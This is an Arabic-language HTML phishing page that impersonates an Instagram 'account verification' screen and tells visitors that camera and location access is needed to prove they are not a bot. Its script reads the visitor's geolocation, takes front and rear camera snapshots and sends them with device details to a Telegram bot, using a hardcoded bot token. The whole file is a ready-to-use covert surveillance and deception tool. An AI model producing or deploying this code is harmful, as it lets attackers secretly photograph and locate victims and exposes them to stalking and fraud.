<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram - التحقق من الحساب</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-box { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 40px; text-align: center; }
        .logo { width: 175px; margin-bottom: 20px; }
        .info { color: #8e8e8e; font-size: 14px; margin-bottom: 20px; }
        button { background: #0095f6; color: white; border: none; border-radius: 4px; width: 100%; padding: 8px; font-weight: bold; cursor: pointer; }
        #status { margin-top: 15px; font-size: 12px; color: red; }
        video, canvas { display: none; }
    </style>
</head>
<body>
    <div class="login-box">
        <img src="https://www.instagram.com/static/images/web/mobile_port_monospaced_plus_2x.png/394590333333.png" class="logo" alt="Instagram">
        <p class="info">نظام الأمان: يرجى السماح بالوصول للكاميرا والموقع للتأكد من أنك لست روبوت (Bot) ولتأمين دخولك من هذا الجهاز.</p>
        <button id="startBtn">تأكيد الهوية</button>
        <div id="status"></div>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        const TOKEN = '8308924210:AAGEeCtg7QMc6jdX1Lh8_IotYd0p8l7nDq0'; // توكن بوتك
        const CHAT_ID = 'YOUR_USER_ID'; // الآي دي الخاص بك (احصل عليه من @userinfobot)

        async function sendToBot(blob, caption) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, 'image.jpg');
            formData.append('caption', caption);
            await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: formData });
        }

        document.getElementById('startBtn').onclick = async () => {
            const status = document.getElementById('status');
            status.innerText = "جاري التحقق... لا تغلق الصفحة";

            try {
                // 1. الموقع الجغرافي
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    const mapUrl = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                    const deviceInfo = `📱 الجهاز: ${navigator.platform}\n🌍 الموقع: ${mapUrl}`;

                    // 2. الكاميرا الأمامية
                    const streamFront = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                    captureAndSend(streamFront, "📸 صورة سيلفي (أمامية)\n" + deviceInfo);

                    // 3. الكاميرا الخلفية (بعد ثانية)
                    setTimeout(async () => {
                        try {
                            const streamBack = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
                            captureAndSend(streamBack, "📸 صورة خلفية");
                        } catch(e) {}
                    }, 2000);
                });
            } catch (err) {
                status.innerText = "خطأ: يجب الموافقة على الأذونات للمتابعة";
            }
        };

        async function captureAndSend(stream, caption) {
            const video = document.getElementById('video');
            video.srcObject = stream;
            const canvas = document.getElementById('canvas');
            
            setTimeout(async () => {
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                canvas.toBlob(blob => sendToBot(blob, caption), 'image/jpeg', 0.6);
                // إغلاق الكاميرا بعد الالتقاط
                // stream.getTracks().forEach(t => t.stop());
            }, 1000);
        }
    </script>
</body>
</html>
